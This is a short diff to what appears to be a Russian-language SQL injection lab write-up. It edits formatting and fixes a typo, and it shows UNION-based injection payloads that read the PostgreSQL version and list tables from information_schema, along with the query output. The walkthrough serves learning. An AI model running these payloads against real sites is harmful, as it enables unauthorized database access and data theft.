@@ -69,11 +69,11 @@ category=Gifts'+UNION+SELECT+NULL,+version()--+-
 SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, version()-- -' AND released = 1 
 ```
 
-```sql
+`
 PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu
-```
+`
 
-Следующим шагом пытается из `information_schema.tables` вытащить нужные нам таблицы и отфлитровать через нужную колонку:
+Следующим шагом пытаемся из `information_schema.tables` вытащить нужные нам таблицы и отфлитровать через нужную колонку:
 
 ```sql
 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema ='public'--
